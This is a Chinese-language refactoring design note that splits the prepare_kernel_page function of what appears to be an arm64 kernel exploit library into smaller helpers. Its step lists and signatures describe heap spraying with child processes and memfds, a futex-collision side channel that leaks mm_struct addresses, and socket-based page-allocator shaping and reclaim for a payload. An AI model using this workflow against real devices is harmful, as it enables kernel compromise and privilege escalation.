# S4 设计：prepare_kernel_page 拆分（2026-10-21）

> 从属 [split-large-functions](../plan/split-large-functions.md) S4。目标：~214 行 → 小函数；不改 clone/open/kill/close/sendmsg 顺序。

## 拆分

```c
static int prepare_reset(Glk43499Session *s);
static int prepare_spray_contexts(Glk43499Session *s,
                                  const struct timespec *t0);
static void prepare_leak_children(Glk43499Session *s);
static int  prepare_wait_collisions(Glk43499Session *s,
                                    const struct timespec *t0);
static uintptr_t prepare_leak_mm(Glk43499Session *s,
                                  const struct timespec *t0);
static uintptr_t prepare_payload(Glk43499Session *s,
                                 const GlkWriteRequest *req, uintptr_t base,
                                 const struct timespec *t0);
static uintptr_t prepare_fail(Glk43499Session *s);
```

### prepare_reset

```text
close_reclaim_sockets
cleanup_page_prepare_state
mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz()
if (mm_objs_per_slab == 0) return -1
prepare_ctxs
skb_buf = malloc(SKB_SEND_SIZE); memset 0x41
```

返回 0/-1；-1 走统一 fail。

### prepare_spray_contexts

1. prepare_ctx 每个 clone_child + open_memfd
2. spray_ctx 每个 clone_child + open_memfd
3. `kernelsnitch_setup(...)`；返回 NULL → 立即 kill spray_ctx children
   （避免新增失败点泄漏），返回 -1；prepare_ctx 由 prepare_fail 处理。
4. 日志 ready

返回 0/-1。**不创建** child_leak/pre/post。

### prepare_leak_children

1. pre_ctx clone_child
2. child_leak = clone_leak_child
3. post_ctx clone_child
4. pre/post memfd open；memfd_leak open
5. kill pre/post/spray children（顺序不变）

### prepare_wait_collisions

保持原 waitpid 循环：

- WNOHANG 每 50ms
- >60s kill + waitpid
- 每 2s 进度日志（scan_done/total，futex 0x…）
- 退出状态非 0 日志
- 返回 `kernelsnitch_found_collisions(rt->ks)`

### prepare_leak_mm

1. `kernelsnitch_bruteforce(rt->ks)`
2. `leaked=rt->ks->mm_struct`；`leaked |= 0xf<<56`
3. `rt->last_mm_struct=leaked`
4. 校验 `leaked != -1`、`>= KERNELSNITCH_IDENTITY_START`、`< DIRECT_MAP_END`
5. 失败返回 0；成功返回 leaked

### prepare_payload

1. `base = leaked & ~(ORDER3_SIZE-1)`
2. `prepare_skb_payload(s, req, base)`；失败返回 0（不 cleanup，交给 fail）
3. reclaim socketpair + SO_SNDBUF + O_NONBLOCK
4. pcp shaping socketpair + iov/msg + sendmsg
5. `pin_to_core(CORE(s))` + 4×sched_yield
6. close pre_ctx 全部 memfd；post_ctx 除最后一个；spray_ctx 每 slab
7. close shaping fd；4×yield；close memfd_leak
8. `SKB_RECLAIM_SENDS` 次 sendmsg(reclaim_sv[0], MSG_DONTWAIT)
9. 日志 payload ready；`kernelsnitch_cleanup`；ks=NULL
10. close prepare_ctx memfd + kill prepare child
11. 返回 base

### prepare_fail

```text
if (ks) kernelsnitch_cleanup(ks); ks=NULL
kill prepare_ctx children
cleanup_page_prepare_state
return 0
```

## 编排（单一失败出口）

```c
t0 = now
uintptr_t result = 0;
if (prepare_reset(s) != 0) goto fail;
if (prepare_spray_contexts(s, &t0) != 0) goto fail;
prepare_leak_children(s);
if (prepare_wait_collisions(s, &t0)) {
  uintptr_t leaked = prepare_leak_mm(s, &t0);
  if (leaked) {
    uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
    result = prepare_payload(s, req, base, &t0);
  }
}
fail:
return result ? result : prepare_fail(s);
```

只有一个 `prepare_fail` 调用点（`fail:` 之后的 return 表达式），flatten 不重复展开。

只有一个 `prepare_fail` 调用点，flatten 不重复展开。

## 所有权

- `prepare_ctx/spray/pre/post`、skb、ks 仍由 session rt 持有。
- prepare child 由 prepare_fail/payload 末尾 kill；child_leak 已 wait。
- reclaim/pcp shaping fd 生命周期与当前一致；pcp shaping 关闭后 sendmsg。

## 风险

- `prepare_skb_payload` 失败不得提前 cleanup；统一 fail。
- `prepare_fail` 只 kill prepare_ctx，不 kill child_leak（已 wait）。
- pre/post/spray kill 顺序不变：pre/post/spray。
- `prepare_reset` 保证 `mm_objs_per_slab > 0`；post_ctx close 循环加 `mm_cnt > 0`；
  spray 步进循环加 `step > 0` 保护。
- `sendmsg` 循环 break 语义不变。

## 门禁

```text
build 0 warnings
python3 tools/important_flatten.py \
  build/native/baseline-20261021/libghostlock43499.so \
  build/app/intermediates/cxx/Debug/12l21261/obj/arm64-v8a/libghostlock43499.so \
  --parent prepare_kernel_page \
  --helper prepare_reset --helper prepare_spray_contexts \
  --helper prepare_leak_children --helper prepare_wait_collisions \
  --helper prepare_leak_mm --helper prepare_payload --helper prepare_fail
# COUNT/ORDER PASS；args_diff 仅报告
cmp_disasm --important-only：无新增 COUNT/ORDER FAIL
llvm-nm b/B=0
```
